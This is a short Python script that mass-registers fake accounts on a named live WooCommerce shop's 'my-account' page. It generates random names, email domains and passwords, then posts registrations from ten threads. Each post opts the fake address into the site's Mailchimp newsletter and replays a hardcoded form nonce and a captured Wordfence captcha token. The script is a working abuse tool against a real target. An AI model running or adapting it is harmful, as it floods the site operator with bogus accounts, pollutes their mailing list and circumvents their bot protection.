import requests as request
import json
import os
import random
import string
import threading

url = 'https://web-systems.co.uk/my-account/'

emailList = []

chars1 = string.ascii_letters + '123456789' #creates random string to use for random email domain

for i in range(100): #creates 100 random email domains and appends them to 'emailList' 

	x ='@' + ''.join(random.choice(chars1.lower())for i in range(5))+ '.com'
	emailList.append(x)
	
print (emailList) #just veryifying the append worked

names = json.loads(open('names.json').read()) #loads the file with a bunch of generic names in to use for the left side of email

chars = string.ascii_letters + string.digits + '!%^&*()@#./' #used to create a random password
random.seed = (os.urandom(1024))


threads = []



def main(name): #function for the main part of the program
	for name in names:
		name_extra = ''.join(random.choice(string.digits)) #creates a random 'choice' of letters/digits/symbols from the chars 

		username = name.lower() + name_extra + random.choice(emailList) #combines all the elements. So a name from names.json, random letters/digits/symbols we created above then adds the random email domain
		password = ''.join(random.choice(chars)for i in range (8))

		request.post(url, allow_redirects=True, data={

												'email':username, #variable created above
												'password':password, #variable created above
												'mailchimp_woocommerce_newsletter':'1',
												'woocommerce-register-nonce':'580288d494',     #sends the required request method fields
												'_wp_http_referer':'/my-account/',
												'register':'Register',
												'wfls-captcha-token':'HFcnB1YQlTGjoCZ3ZAXFpRXR4WOgoCAA8LM3AyDQ9xMyp1d3EPM34HFjBVQDR8ZE9iRSYkARQGcBQMEWJeQzFIHzEFIAl4ZjNfPSUnAHBBVlJiZ1ltXXsWf14jI3dZShxVWkJgWFswGQpBZjUMHHNHO3p3NVdHVhNiS0R3CA56fUlGWWJ9B2l4YGx3LR0CZgt5',
												'wfls-email-verification':''
												})
		print('sending username %s and password %s' %(username, password))  #prints each one it creats in the format username(email), password

if __name__ == '__main__':
	for i in range(10):
		t = threading.Thread(target=main, args=(1,)) #this sets up threading so it allows for the program to run fast
		t.start() #starts the threads
